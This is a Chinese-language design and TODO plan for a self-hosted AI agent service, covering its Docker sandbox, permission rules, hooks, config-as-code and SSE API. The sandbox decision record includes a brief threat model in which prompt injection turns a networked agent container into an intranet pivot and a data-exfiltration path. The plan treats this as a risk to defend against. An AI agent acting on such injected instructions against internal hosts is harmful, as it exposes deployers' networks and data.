# vanilla-agent 实现规划

> 单一事实来源（source of truth）的实现计划与 TODO 清单。
> 规则（按 CLAUDE.md）：**每个 TODO 项需要单独审批后才能开工**；批准整体计划 ≠ 批准全部 TODO；一次只实现一个 TODO；实现后立即验证并回写状态。
>
> 状态标记：`⬜ 待办` `🔵 进行中` `✅ 完成（含验证）` `⚠️ 受阻`
> 当前进度：**3 / 81 TODO 完成**（r3.3）。里程碑 14 个；T0.1a、T0.1b、T0.2 已完成；M0 剩余 T0.3–T0.5。（T0.1c 已撤销，见 ADR-007）
>
> **r2 变更（2026-11-20）**：skills / tools / subagents / MCP / plugins / permissions / hooks 全部改为**随项目版本管理的配置文件**，不入数据库、不提供服务端修改端点、用户不可改（ADR-015）。里程碑由 13 个增至 14 个（新增 M1 配置层），DB 表由 25 张减至 14 张（删除 11 张配置表）。
>
> **r3 变更（2026-11-20）**：① **开放注册 + 取消 admin 角色** —— `users.role` 删除、无 `/admin/*`、无 `require_admin`；运维动作改走 shell（`SIGHUP` reload、`python -m app.config dump`、`scripts/*.py`），用户侧只留脱敏的 `GET /capabilities`。② **provider 只要 `base_url`/`api_key`/`model_name` + 通用参数，不接 Azure**。③ **凭据只有一把全局 key** ⇒ 新增 `global_hourly_tokens` 账户级熔断与 `sandbox.max_live_containers` 容量护栏（§8.10）。④ 沙箱网络三档可配，**缺省 `none`**；放宽档必须每用户一张自定义网络（跨用户不可达是 T6.4 的验收断言）；`none` 的三条硬要求：镜像预烘焙工具链、网络失败翻译成人话、必须有一条"全程无网冒烟"（§8.4、T6.3/T6.6/T13.7③）。⑤ `session` 授权存活边界维持 thread 内。⑥ 配置变更工作流维持"建议片段"。详见 §13.1 的 D1–D8 追溯表。

---

## 1. 目标与非目标

### 1.1 目标

构建一个 **framework-free**（不引入 LangChain / LlamaIndex / 任何 agent 框架，直接调 provider SDK）的、功能相对完整的 AI agent 服务：

| 能力 | 含义 |
|---|---|
| agent 主循环 | 多轮 tool-use 循环、取消、错误恢复、轮次与预算约束 |
| tools | 声明式工具注册表；内置 read/write/edit/glob/grep/list/bash/http_fetch 等；启用/限额由 `config/tools.yaml` 决定 |
| skills | `config/skills/<slug>/SKILL.md` + frontmatter，progressive disclosure 注入 |
| subagents | `config/agents/<name>.md` 定义，`task` 工具派生子 run，事件回传父流 |
| MCP | 官方 SDK 作 client，stdio + streamable HTTP，server 清单来自 `config/mcp.yaml` |
| plugins | `config/plugins/<name>/` manifest 打包 skills/agents/tools/hooks/mcp，enable/trust 由 `config/plugins.yaml` 声明 |
| permissions | `config/permissions.yaml` 的 allow/ask/deny 规则引擎 + 权限模式（default/plan/acceptEdits/bypass） |
| hooks | `config/hooks.yaml` 声明 PreToolUse/PostToolUse/UserPromptSubmit/Stop/… 的外部命令与进程内 callable |
| human-in-the-loop | 权限审批、`ask_user` 结构化提问、plan 审批；可跨进程重启恢复 |
| 流式输出 | SSE（事件溯源 + `Last-Event-ID` 断线重放） |
| 前端 | React + Next.js：登录、流式对话、工具卡片、审批交互 |

### 1.2 非目标（v1 明确不做，写下来防止范围漂移）

- **不做配置的服务端可写**：没有任何 API 能增删改 skills/tools/agents/MCP/plugins/permissions/hooks；配置变更的唯一路径是改文件 + 代码评审 + reload。因此也**不做管理控制台页面**（原计划里"推到 v1.1"的那批页面，现在直接出局）。
- 不做水平扩展 / 多节点调度（run supervisor 是进程内 asyncio，见 ADR-014）。
- 不做向量记忆 / RAG / 长期 memory 检索。
- 不做 web search 工具（只有 `http_fetch`）。
- 不做 IDE 插件、CLI 客户端、移动端。
- 不做 k8s 部署、不做 sandbox 内 gVisor/Firecracker 级强隔离（接受 runc + cap-drop 的威胁模型，见 §8.4）。
- 不做 plan-mode 下的 git worktree 隔离（subagent 共享 workspace）。
- 不做 per-user 能力定制（不同用户看到不同 tools/skills）；所有用户共享同一份配置快照。

---

## 2. 决策记录（ADR）

| # | 决策 | 理由 / 代价 |
|---|---|---|
| ADR-001 | **OpenAI SDK + Chat Completions API**，不用 Responses API | 循环与工具语义完全自控、可移植。**provider 形态（§13-D1 已决）**：`config/settings.yaml` 只暴露 `base_url` + `api_key`（值经 `${env:OPENAI_API_KEY}` 引用，**全局唯一一把**）+ `model_name` + 通用默认参数（`temperature`/`max_tokens`/`top_p`/超时/重试/`allowed_models`）。**不做 Azure OpenAI 专用分支** —— api-version query、deployment 路由、AAD/Entra token 刷新都不实现；要用 Azure 就前面挂一层 OpenAI-compatible 网关。代价：Azure-only 用户需要自备转换层，我们不承担那部分鉴权复杂度。reasoning item、内置 web search 等同样自己做或不做（不在范围内）。SDK 已在 venv（`openai 3.51`）。 |
| ADR-002 | **事件溯源为核心**：`event_log` 是唯一真相流 | SSE、持久化、HITL 等待、断线重放、subagent 事件转发、trace inspector、调试全部复用同一模型。代价：需要 retention/compact 策略。 |
| ADR-003 | **SQLite + 手写迁移**（stdlib `sqlite3`，不引 Alembic） | WAL + `busy_timeout` + 单写者 executor 足够这个规模。要求 SQLite ≥ 3.37（UPSERT + JSON1），部署环境不满足即 fail fast。**入库的只有运行时事实**（对话、run、事件、工具调用、中断、用量、审计）。 |
| ADR-004 | **多用户 + cookie session + 开放注册，且没有 admin 角色**（用户选定，r3 修订） | `users`/`sessions` 表、HttpOnly `SameSite=Lax` cookie + double-submit CSRF token、口令用 stdlib `hashlib.scrypt`（零依赖、memory-hard）。**`users.role` 取消**：能力全在文件里（ADR-015），应用内不存在"能改配置的角色"，所以 admin 是个空概念 —— 有 shell 的运维才是配置的唯一变更者，那是部署身份不是应用角色。`users.status`(active/disabled) 保留，只由运维 CLI 改（滥用注册时需要能关掉账号）。所有用户**共享同一份能力快照**，隔离的是 thread/消息/用量/workspace。<br>**连带后果（必须正视）**：开放注册 + 沙箱 bash + 只有一把 provider key ⇒ 任何互联网访客注册后就能消耗同一账户的钱与宿主的内存。护栏见 §8.10/§8.11（per-user 预算 + 全局容器上限 + 注册限速），默认值按部署环境的可用内存核定。 |
| ADR-005 | **Docker 沙箱执行**（用户选定） | 每 workspace 一个**长生命周期**容器（保留 cwd/env/已装包等状态），命令走 `docker exec`；`--cap-drop ALL`、`no-new-privileges`、`--memory/--cpus/--pids-limit`、`--tmpfs /tmp`、idle TTL 回收；用 container **label** 而非 name 做重启对账。经 `asyncio` 子进程调 `docker` CLI，**不引入 docker-py**。要求 Docker Engine（支持 user-defined bridge 与 `--internal`）+ cgroup v2，启动探测不满足即 fail fast。<br>**网络（§13-D5 + D8 已决：默认最严）**：`settings.sandbox.network_mode` 三档 —— **`none`（默认，r3 改判：连内部 DNS 都不要，跨用户/网关/metadata 全部物理不可达）** / `internal`（自定义网络加 `--internal`，只能同网内）/ `per_user_bridge`（每用户一张自定义 bridge，可出网；部署者显式改配置 + `kill -HUP` 才生效）。两条验收要求：(1) 绝不用默认 `bridge` 网络 —— 同网段容器互通，会打破跨用户隔离；(2) 网络模式变更 = 配置变更（走文件 + reload），不做运行时协商。<br>**镜像源必须可配置**：不少部署环境需要 mirror 才能拉镜像/装包（dockerd `registry-mirrors`、`PIP_INDEX_URL`、apt mirror、uv `[[index]]`），因此 mirror 走 `settings.sandbox.*` 注入（T6.3），且构建失败的报错必须指名失败的源，而不是只抛 docker 退出码。<br>**缺省 `none` 的设计后果（不是小事，T6.3/T6.6 要落实）**：容器**运行时**完全无网 ⇒ agent 不能 `pip install`/`npm install`/`git clone` 任何东西 ⇒ 沙箱镜像必须**预烘焙**工具链（coreutils/git/rg/jq + 一组常用 Python 包），"加一个依赖"变成"改 Dockerfile + `make sandbox-build`"这一配置级动作。注意 **build 期与运行期是两件事**：`docker build` 走 dockerd 自己的网络，`--network none` 只约束运行期 —— 别把两者混在一条配置里。同时 `none` 下"网络不可达"是**预期行为而非故障**，bash 工具与错误信息必须能把它解释清楚（见 T6.6），否则用户只会看到一堆诡异的 socket 超时。<br>**放宽到出网档的已知代价（写成部署前提，应用层不假装解决）**：沙箱会落在部署环境的同一网段 ⇒ 可达路由器管理页、NAS、内网 HTTP 服务等；配合 prompt injection 即成内网 pivot 与数据外泄通道。云主机还需 route/防火墙挡 `169.254.169.254`。缺省 `none` 就是为了把这条整体移出默认状态；要放宽就是改配置 + `kill -HUP`，即"每一次开网络都是一次有记录的配置变更"。 |
| ADR-006 | **文件工具在 host 侧操作 bind mount 目录** | 与容器 `/work` 是同一份字节，host 侧 realpath 约束即可，比每次 `docker exec cat` 快且好测；bash/脚本类留在容器内。 |
| ADR-007 | **MCP 用官方 `mcp` SDK**（用户选定）+ 自写 adapter | 协议生命周期（initialize / tools·list / tools·call / elicitation / sampling）由成熟实现负责；我们只做 `MCPBridge → ToolRegistry` 的命名与权限映射 `mcp__<server>__<tool>`。**server 清单来自 `config/mcp.yaml`，工具目录只在内存里**（启动时 connect + `tools/list`，不入库）。**依赖与导入面的既定事实**：`mcp` 拉入 `pyjwt[crypto]`→`cryptography`、`cffi`、`sse-starlette`、`python-multipart`、`jsonschema`、`mcp-types` 等（本仓库因此从 37 包增至 61 包）；且 SDK 的 client 包在模块级就 import 了 server 包（`mcp/client/client.py` → `client/_memory.py` → `from mcp.server import Server`），因此任何 client 用法都会把整个 `mcp.server` 代码树载入本进程。**结论**：不使用 server 侧的*功能*，但不要用 import 图去"证明"这一点（该约束不可执行，故不设守卫用例）；口径落在两条可评审的约定上 —— (1) 不实现、不挂载我们自己的 MCP server（真要写时另行评审：那时 `mcp.server.request_state` 的 AESGCM key 才成为我们要管理的密钥），(2) `cryptography` 只作传递依赖，不进 `pyproject` 的直接依赖列表、不被 `app/**` import。 |
| ADR-008 | **Skills / Subagents = Markdown + YAML frontmatter，放在 `config/` 下** | 与 Claude Code 习惯一致，纯文本可版本管理；skill 正文按需注入（progressive disclosure），系统提示只带 name/description/when_to_use。 |
| ADR-009 | **Permissions = 规则引擎（读自 `config/permissions.yaml`）** | pattern grammar `ToolName` / `ToolName(<principal>)`，效果优先级 **deny > ask > allow**（不看特异性），叠加 mode preset 与 tool 的 `read_only`/`destructive` 默认值。授权范围只保留 **`once` / `session`** 两档：`always` 意味着写配置，与 ADR-015 冲突，改为"复制一段建议规则 YAML 供提交评审"。 |
| ADR-010 | **Hooks = 外部命令 + 进程内 callable** | 命令型（stdin JSON、stdout JSON、`exit 2` 即 block）安全面小、可跨语言；callable 型只允许来自 **trusted 插件**（in-process 即 service 权限）。声明来源 `config/hooks.yaml` + 插件 manifest。超时策略可配 `on_timeout: block\|allow`。 |
| ADR-011 | **Plugins = 仓库内资源包 + enable/trust 分离** | manifest 声明 skills/agents/mcp/tools/hooks；`enabled` 控制装配、`trusted` 才允许进程内 Python entry point。两者都写在 `config/plugins.yaml`，**只有改文件（运维/代码评审）能变更** —— r3 起系统里没有 admin 角色，因此 `trusted` 不是"管理员在 UI 里点的勾"，而是一个需要评审的提交内容。reload = 配置快照原子替换，不中断在跑的 run；触发方式是 **SIGHUP 或重启**（不再有 HTTP reload 端点，理由见 §7）。 |
| ADR-012 | **HITL = 统一 `interrupt` 表 + run 状态机** | 权限审批 / `ask_user` / plan 审批 / MCP elicitation 共用一套持久化 + `asyncio.Future` + timeout + 重启后可 resolve 的机制。**中断的事实入库（`interrupt` + `event_log`），中断的效果不入库**（`session` 授权只在进程内 TTL 表）。 |
| ADR-013 | **前端 Next.js（App Router）+ TS + Tailwind，自写 SSE reader**（用户选定 v1 范围：聊天 + 审批） | 需要 POST header（CSRF/session）所以不用原生 `EventSource`，用 `fetch` + `ReadableStream` 自解 SSE 帧；事件类型由后端 pydantic JSON Schema 生成 TS，避免手写漂移。 |
| ADR-014 | **单节点部署** | run 状态在进程内，重启靠 `event_log` + `interrupt` 恢复；跨节点需要外部队列，不在 v1。reload 语义也因此天然是"本进程"。 |
| **ADR-015** | **config-as-code：装配面 = 仓库文件，DB 只存运行时事实，服务端不接受配置写入**（用户选定） | 一句话原则：**"agent 能做什么"进 git，"agent 做了什么"进 SQLite。** 收益：能力变更天然可评审、可回滚、可 diff；启动即可确定完整能力面（skills/tools/MCP/plugins/hooks/permission rules 全在 `ConfigSnapshot` 里），`config-check` 能在 CI 抓到"skill 引用了被关掉的工具"这类错；DB schema 大幅瘦身（25→14 表），去掉自研 at-rest 加密与主密钥管理（注意：`cryptography` 仍经 `mcp→pyjwt[crypto]` 作为**传递依赖**存在，但不再是我们的直接依赖，也不被 `app/**` 使用 —— 见 ADR-007）；不存在"配置被运行时篡改导致提权"的攻击面（除了文件本身）。代价（三条均已确认接受）：改配置要 reload/重启（SIGHUP，见 §7）；无法 per-user 定制；**provider 花费无法按用户区分 —— 只有一把全局 key（§13-D2），所以账户级隔离靠 per-user token 预算兜底（§8.10），不是靠凭据**。**新增的信任边界：`config/` 目录的文件权限**（§8.7）。 |

---

## 3. 架构总览

```
仓库版本管理（运维/评审唯一写入路径）              运行时进程（只读）
┌───────────────────────────────────┐   ┌──────────────────────────────────────────┐
│ config/                           │   │ ConfigLoader → ConfigSnapshot (immutable) │
│   settings.yaml   tools.yaml      │──▶│   version, sources[sha256], 合并后视图     │
│   permissions.yaml hooks.yaml     │   │   ├ ToolRegistry      ├ SkillIndex        │
│   mcp.yaml        plugins.yaml    │   │   ├ AgentIndex        ├ HookBus           │
│   skills/<slug>/SKILL.md          │   │   ├ MCPPlan(+已连工具) ├ PermissionsPolicy│
│   agents/<name>.md                │   │   └ 原子替换；run 持有旧引用 → 不撕裂      │
│   plugins/<name>/.vanilla-plugin/ │   └──────────────────────────────────────────┘
└───────────────────────────────────┘                     ▲ kill -HUP <pid>（运维触发，无 HTTP 端点）

                         ┌────────────────────────── web/ (Next.js) ─────────────────────────┐
                         │  /login  /chat(thread)  [ToolCard] [ApprovalDialog] [TracePanel]  │
                         └───────▲───────────────────────────────────────────┬───────────────┘
                    REST/JSON    │        SSE (event stream, Last-Event-ID)   │ resolve(once/session)
┌────────────────────────────────┴───────────────────────────────────────────▼────────────────────────┐
│ service/ (FastAPI, 单进程 asyncio)                                                                     │
│  api/  auth(register,login) │ threads │ runs │ messages │ stream │ interrupts │ usage │ capabilities │
│    └───────────────────────────────────────┬─────────────────────────────────────────────────────────│
│  agent runtime (RunManager → RunTask)      │                                                         │
│    loop: ContextBuilder(snapshot) → ModelClient → 解析流 → tool_calls?                                 │
│              │                     │             │                                                   │
│              │                     │             ▼                                                   │
│   ┌──────────┴────────┐   ┌────────┴────────┐  ToolDispatcher                                        │
│   │ ContextBuilder    │   │ ModelClient     │   ├ PermissionEngine ← snapshot.permissions            │
│   │  system prompt    │   │  (openai SDK)   │   │   + SessionGrantStore(内存 TTL)                    │
│   │  skills index     │   │  + Scripted fake│   ├ HookBus ← snapshot.hooks                           │
│   │  tool catalog     │   └────────┬────────┘   └ ToolRegistry ← snapshot.tools                      │
│   │  compaction       │            │ deltas                │ results/artifacts                       │
│   └───────────────────┘            ▼                       ▼                                         │
│                             EventRecorder ──→ event_log(SQLite) ──→ EventStream(SSE fan-out)          │
│                                    ▲                                                                │
│                    interrupt 表 ───┘  (awaiting_input；跨重启可 resolve)                               │
│  workspace/ (per-user 目录 + 路径约束)      sandbox/ (docker exec | local | fake)                     │
└──────────┬────────────────────────────────────────────────────────────────────────────┬─────────────┘
           │ SQLite (WAL)：只存运行时事实                                                  │ docker CLI
   ./data/vanilla.db, ./data/artifacts/             container per workspace（默认无网络）
                          -v ./data/workspaces/<user>:/work  --network none（放宽才建 va-net-<user>）
```

主循环不变量（每个都要有对应测试，见 §10）：

1. **单一 writer**：run 的消息与事件只能由该 run 的 task 产生；subagent 事件带 `source_run_id` 汇入父 thread 流。
2. **事件单调递增 seq**：`event_log.id`（全局 rowid，SSE cursor）+ `(run_id, seq)`（run 内有序，重放用）。
3. **可取消**：`cancel_requested` 检查点在每个 await 边界；模型流与 `docker exec` 都要响应 `CancelledError`。
4. **中断不丢状态**：`awaiting_input` 的 run 只依赖 DB 行，进程重启后仍可被 resolve 并继续。
5. **输出不可信**：tool 结果、`http_fetch`、MCP 返回一律标注 untrusted 并做注入加固（§8.5）。
6. **配置快照不可变且被 run 引用**：run 全程使用启动时的 `ConfigSnapshot`；reload 只影响新 run。任何"运行中发现配置不一致"的分支都不存在。
7. **服务端零配置写入**：不存在写 `config/` 的代码路径；进程对 `config/` 只读挂载或属主非服务账号。

---

## 4. 核心契约

> 这些是模块之间的接缝。先定契约、再填实现，保证每个 TODO 可独立验证。

```python
# app/config/snapshot.py —— r2 新增的核心对象
class ConfigIssue(BaseModel):
    level: Literal["error","warning"]
    source: str          # "config/permissions.yaml:41"
    path: str            # "rules[3].effect"
    message: str

class ConfigSnapshot:
    version: int                              # 单调递增，写进 run.params_json 便于复现
    loaded_at: datetime
    sources: list[tuple[str, str /*sha256*/]] # 哪些文件组成了这份配置
    settings: Settings     # provider/model/温度/max_turns/预算/sandbox 限额/default_mode/能力位
    tools: ToolConfig      # 内置工具 enabled + timeout + max_result_bytes + 参数上限
    permissions: PermissionsConfig  # default_mode, rules[], mode preset, policy(禁 bypass 等)
    hooks: HookConfig      # event → matcher → command|python, timeout, on_timeout
    mcp: MCPConfig         # servers[], connect 超时, tool 目录刷新策略
    plugins: PluginsConfig # name/path/enabled/trusted
    skills: SkillIndex     # slug → 元数据 + 正文路径 + 内容 hash
    agents: AgentIndex     # subagent 定义
    issues: list[ConfigIssue]
    def validate(self) -> list[ConfigIssue]: ...   # 收集全部问题，不抛异常（供 CI / config-check）

async def load_config(root: Path) -> ConfigSnapshot        # error 非空则拒绝启动（除非 CONFIG_PERMISSIVE=1）
class ConfigStore:  # 持有当前 snapshot；swap() 先构建+校验新快照，全绿才原子替换；失败保留旧的
    current: ConfigSnapshot
    async def reload(self) -> ReloadReport

# —— 配置文件到资源的贡献关系（合并优先级）——
# settings.yaml 默认  <  plugins/<name>/* 贡献  <  *.local.yaml 覆盖（仅 CONFIG_ALLOW_LOCAL=1）
# permission rules：所有来源并集，deny 永远赢；插件不得声明 bypass，也不得覆写
#   permissions.yaml 里的 policy 段（那是运维声明的硬约束，不存在"运行时管理员"能改它）。
# 同名冲突（skill slug / tool name / mcp server name / hook matcher）→ error，不允许静默覆盖。

# app/agent/events.py —— 事件信封（所有对外流式都用它）
class Event(BaseModel):
    v: Literal[1]
    seq: int                 # run 内单调
    cursor: int              # event_log.id = SSE Last-Event-ID
    ts: datetime
    thread_id: UUID
    run_id: UUID
    source_run_id: UUID | None   # subagent 事件转发时指向子 run
    type: EventType
    payload: dict

class EventType(StrEnum):
    # 值 = SSE 的 `event:` 字段，点分小写，发布后不改名（前端 reducer 按 value 匹配）
    RUN_STARTED = "run.started"
    RUN_STATUS = "run.status"
    RUN_FINISHED = "run.finished"
    RUN_FAILED = "run.failed"
    RUN_CANCELLED = "run.cancelled"
    MESSAGE_STARTED = "message.started"
    TEXT_DELTA = "text.delta"
    THINKING_DELTA = "thinking.delta"
    MESSAGE_COMPLETED = "message.completed"
    TOOL_CALL_STARTED = "tool_call.started"
    TOOL_ARGS_DELTA = "tool_call.args_delta"
    TOOL_CALL_COMPLETED = "tool_call.completed"
    TOOL_CALL_FAILED = "tool_call.failed"
    PERMISSION_REQUESTED = "permission.requested"
    PERMISSION_RESOLVED = "permission.resolved"
    INTERRUPT_RAISED = "interrupt.raised"
    INTERRUPT_RESOLVED = "interrupt.resolved"
    HOOK_STARTED = "hook.started"
    HOOK_FINISHED = "hook.finished"
    HOOK_BLOCKED = "hook.blocked"
    SUBAGENT_STARTED = "subagent.started"
    SUBAGENT_FINISHED = "subagent.finished"
    CONTEXT_COMPACTED = "context.compacted"
    USAGE = "usage"
    ERROR = "error"
    HEARTBEAT = "heartbeat"
# 注 1：不再有 CONFIG_CHANGED 之类事件；reload 由运维经 SIGHUP 触发（无 HTTP 端点，见 §7）。
# 注 2：必须写成 `MEMBER = "value"` 形式 —— T5.3 的 JSON Schema 生成依赖 StrEnum 的 value，
#       裸成员列表（`A, B, C`）在 StrEnum 下不是合法枚举定义，会生成空 union 并让"漂移即失败"崩在这里。

# app/agent/model.py
class ModelClient(Protocol):
    async def stream(self, req: ModelRequest) -> AsyncIterator[ModelEvent]: ...
    # ModelEvent: TextDelta | ReasoningDelta | ToolCallDelta | UsageDelta | Stop(reason)

# app/tools/base.py
@dataclass(frozen=True)
class ToolSpec:
    name: str                      # 全局唯一；mcp/plugin 用命名空间前缀
    description: str
    input_schema: dict             # JSON Schema（发给模型）
    args_model: type[BaseModel]    # host 侧校验
    namespace: Literal["builtin","mcp","plugin"]
    kind: Literal["read","write","exec","network","interactive","agent","meta"]
    read_only: bool
    destructive: bool
    concurrency_safe: bool         # True → 可与其他 safe 工具并行
    timeout_s: float               # 初值来自 ToolConfig，可被 tools.yaml 收紧（不能放宽超过硬上限）
    max_result_bytes: int
    def permission_target(self, args: dict) -> str | None: ...   # 例: "git status", "src/a.py"
    handler: Callable[[ToolContext, dict], Awaitable[ToolResult]]

@dataclass
class ToolResult:
    ok: bool
    content: str | list
    artifact_id: UUID | None
    metadata: dict               # exit_code, duration_ms, truncated, ...

# app/permissions/types.py
Decision = Literal["allow","ask","deny"]
class PermissionResult(BaseModel):
    decision: Decision
    rule: PermissionRuleRef | None   # 指向 config 文件 + 序号，不指向 DB 行
    mode: PermissionMode
    reason: str
    suggested_grant: Literal["once","session"] | None
    suggested_rule_yaml: str | None  # 供人工复制去改 config/permissions.yaml

# app/hooks/types.py
class HookOutcome(BaseModel):     # 单个 hook 的结果
    event: HookEvent
    action: Literal["continue","block","modify","inject"]
    reason: str | None
    updated_input: dict | None
    additional_context: str | None
    stop: bool

# app/sandbox/base.py
class Sandbox(Protocol):
    async def ensure(self, ws: Workspace) -> SandboxInfo          # 建/复用容器
    async def exec(self, ws, *, argv: list[str], cwd: str | None,
                   env: dict[str,str], timeout_s: float) -> ExecResult
    async def release(self, ws) -> None
# 实现：DockerSandbox(生产) / LocalSandbox(仅 dev, 需 ALLOW_LOCAL_SANDBOX=1) / FakeSandbox(测试)

# app/hitl/interrupts.py
class Interrupt(BaseModel):
    id: UUID; run_id: UUID; type: Literal["permission","question","plan_approval","elicitation"]
    prompt: dict            # 前端渲染所需结构化内容
    status: Literal["pending","resolved","expired","cancelled"]
    timeout_at: datetime
async def raise_interrupt(...) -> dict   # 写 DB + 发事件 + await Future；resolve 端点唤醒

# app/permissions/grants.py —— 取代原 DB 规则表
class SessionGrantStore:      # key = (user_id, thread_id, rule_pattern_key) → 过期时间
    """进程内 TTL；重启或 reload 即失效。不落库，因此不存在'运行时写的规则'变成隐式配置。"""
```

---

## 5. 配置文件与目录（r2 新增）

```
config/                              # 随项目提交，服务只读
  settings.yaml                      # provider: base_url / api_key(${env:OPENAI_API_KEY}) / model_name
                                     #   + temperature/max_tokens/top_p/timeout/retries/allowed_models
                                     # limits: max_turns / wall_clock / per_user_daily_tokens /
                                     #   global_hourly_tokens（全局 key 的唯一硬闸门，§8.10）
                                     # sandbox: memory/cpus/pids_limit, network_mode(**none 默认**|
                                     #   internal|per_user_bridge), max_live_containers, idle_ttl_s,
                                     #   pip_index_url/apt_mirror（仅 build 期与开了网络时才用）
                                     # registration: open(bool) / per_ip_rate / per_ip_daily
                                     # permissions: default_mode / allowed_modes
  tools.yaml                         # 内置工具 enabled、timeout_s、max_result_bytes、参数上限、
                                     #   http_fetch 域名 allowlist、bash 硬超时
  permissions.yaml                   # default_mode + policy(disallow_bypass) + mode preset 覆写 +
                                     #   rules: [{effect, pattern, note?, source?}]
  hooks.yaml                         # hooks: [{event, matcher, kind: command|python, target,
                                     #           timeout_ms, on_timeout, enabled}]
  mcp.yaml                           # servers: [{name, transport, command/args/env, url/headers,
                                     #           requires_approval, enabled, connect_timeout_s}]
  plugins.yaml                       # plugins: [{name, path, enabled, trusted}]
  skills/<slug>/SKILL.md             # frontmatter(name/description/when_to_use/allowed_tools/model/version) + 正文
  skills/<slug>/*.{md,py,sh}         # 附属资源，只读挂载给 agent
  agents/<name>.md                   # frontmatter(name/description/tools/exclude_tools/model/max_turns/
                                     #            permission_mode/timeout_s) + 系统提示正文
  plugins/<name>/.vanilla-plugin/plugin.json   # {name,version,min_service_version,skills[],agents[],
                                     #            mcpServers[],hooks[],tools[],pythonEntryPoints[]}
  plugins/<name>/{skills,agents,hooks,mcp}/...  # 插件贡献的资源
  *.local.yaml                       # 可选的本地部署覆盖（可能含明文 secret），不入库；
                                     #   仅当 CONFIG_ALLOW_LOCAL=1 生效（.gitignore 已覆盖，T0.1a）
```

- **`${env:VAR}` 展开**：`mcp.yaml`/`hooks.yaml`/`plugins.yaml` 里的 secret、path 一律用环境变量引用；配置文件**不得含明文密钥**，`make config-check` 有一条扫描规则（正则命中 `sk-` / PEM header / 长 base64 → error）。
- **路径全部相对仓库根**解析，禁止 `..` 越出 `config/`（skill 附属文件、hook 脚本、插件目录都受此约束）。
- `config/README.md` 说明每个文件职责 + 一次"新增能力"的完整改动清单（改哪几个文件、如何自检）。

---

## 6. 数据模型（SQLite）

`PRAGMA journal_mode=WAL; PRAGMA foreign_keys=ON; PRAGMA busy_timeout=5000;`
`schema_version(version, applied_at, name)` + `service/app/db/migrations/NNNN_*.sql` 顺序执行。

**只存运行时事实。** 相比 r1 删除：`permission_rule` `skill` `subagent_def` `mcp_server` `mcp_tool` `plugin` `plugin_resource` `hook` `secret` `settings` `sandbox_release`（r1 共 25 张 → 删 11 张 → 下表 14 张，已逐行核对）。

| 表 | 关键列 | 说明 |
|---|---|---|
| `users` | id, email UQ, pw_hash, pw_alg, **status(active/disabled)**, max_concurrent_runs, daily_token_budget, created_at, last_login_at, register_ip | 多用户根。**无 `role` 列**（ADR-004：没有 admin 角色）。配额列在注册时从 `settings.yaml` 默认值落库，之后只能由 `scripts/set_user_quota.py` / `scripts/disable_user.py` CLI 改（无 HTTP 端点） |
| `sessions` | id, user_id FK, token_hash UQ, expires_at, last_seen_at, user_agent, ip | cookie 存原始 token，DB 只存 sha256 |
| `workspace` | id, user_id FK UQ, root_path, container_ref, container_state, idle_deadline, created_at | 沙箱运行态；限额/网络模式来自 `settings.yaml` |
| `thread` | id, user_id, workspace_id, title, model, temperature, permission_mode, status, created_at, updated_at, archived_at, last_run_id | `model`/`permission_mode` 是会话运行参数，写入前必须校验 ∈ snapshot.allowed_* |
| `message` | id, thread_id, seq UQ(thread), role, run_id, created_at | 顺序由 seq 保证 |
| `message_part` | id, message_id, type(text/tool_call/tool_result/thinking/image/file), body_json, artifact_id | part 化便于回放渲染 |
| `run` | id, thread_id, user_id, parent_run_id, agent_name, status, model, turn_count, max_turns, started_at, finished_at, error_code, in_tok, out_tok, cache_read_tok, cost_usd, cancel_requested, **config_version**, params_json | `config_version` 让"这轮用的哪套能力"可复现 |
| `event_log` | id INTEGER PK AUTOINCREMENT(cursor), run_id, thread_id, seq, ts, type, payload_json, source_run_id, visibility(ui/internal) | 真相流；retention 可裁剪 |
| `tool_call` | id, run_id, call_id, tool_name, namespace, kind, args_json, status, started_at, finished_at, duration_ms, exit_code, artifact_id, permission_effect, **rule_source**(file:line, 非 FK), **grant_scope**(once/session/none), error_message | 审计 + trace；`rule_source` 只作证据，不指回可写规则行 |
| `interrupt` | id, run_id, tool_call_id, type, prompt_json, status, response_json, created_at, timeout_at, resolved_at, resolver_user_id | 所有 HITL（含权限）统一；**效果不落库**（session grant 在内存） |
| `artifact` | id, sha256 UQ, kind(tool_output/file/compact_summary), media_type, size, storage(path/blob), path, created_by_run_id | 大输出落盘 + 去重 |
| `usage` | id, user_id, run_id, thread_id, model, in_tok, out_tok, cache_read_tok, cache_write_tok, cost_usd, tool_calls, created_at | 配额与看板 |
| `compaction` | id, thread_id, run_id, from_seq, to_seq, summary_artifact_id, tokens_before, tokens_after | 上下文压缩记录 |
| `audit_log` | id, user_id, ts, action, target, detail_json, ip | 登录/登出、grant=session、审批决定、reload、config-check 失败 |

---

## 7. HTTP API 与 SSE 协议

前缀 `/api/v1`。**鉴权豁免是显式白名单，不是路径前缀** —— 免 session 的端点只有：`POST /auth/login`、`POST /auth/register`（**开放注册**，受 per-IP 限速；可用 `settings.registration.open=false` 关闭）、`GET /healthz`。其余全部要求 session cookie，**包括 `/auth/me`、`POST /auth/logout`、`POST /auth/password`**（改密码必须有已认证 principal，绝不接受 body 里的 email 作为身份来源）。

**没有 `/admin/*`，没有 `require_admin`**（§13-D3：无 admin 角色）。运维动作全部走 shell：`python -m app.config dump`（完整诊断视图）、`kill -HUP <pid>`（reload）、`scripts/{list_users,set_user_quota,disable_user}.py`。两个刻意的取舍：

- **配置 reload 不是 HTTP 端点**。开放注册 ⇒ 任何互联网访客都能注册；若 reload 可被任意登录用户触发，就等于把"全局能力快照替换"变成 DoS/churn 面（且能探测出配置文件的抖动时机）。SIGHUP 只对有进程所有权的人有效，天然对齐 ADR-015 的"变更者是运维"。
- **完整能力面不再通过 HTTP 暴露**。`GET /config/report`（来源 sha256、hook matcher、MCP command/args/env 名、plugin 路径）挪到 CLI；用户侧只留 `GET /capabilities` —— 我能调用什么（名称 + 描述），而不是"这套系统怎么搭起来的"。给开放注册用户一张攻击目标地图没有好处。

| 方法 | 路径 | 说明 |
|---|---|---|
| POST | `/auth/register` `/auth/login` `/auth/logout` `/auth/password` | register 开放（无邀请码、无首账号特权），per-IP 限速 + 每日配额；`status` 仅运维 CLI 可改 |
| GET | `/auth/me` | 当前用户 + 能力位 |
| POST | `/threads` | 建 thread（`model`/`permission_mode` 需在 snapshot 允许集合内） |
| GET | `/threads` `/threads/{id}` `/threads/{id}/messages` | 列表（游标分页）/详情/历史 |
| POST | `/threads/{id}/messages` | `{content, attachments, client_msg_id}` → **202 + `{run_id}`** |
| GET | `/threads/{id}/stream?run_id=` | **SSE**：`event:` / `id: <cursor>` / `data: <Event JSON>` |
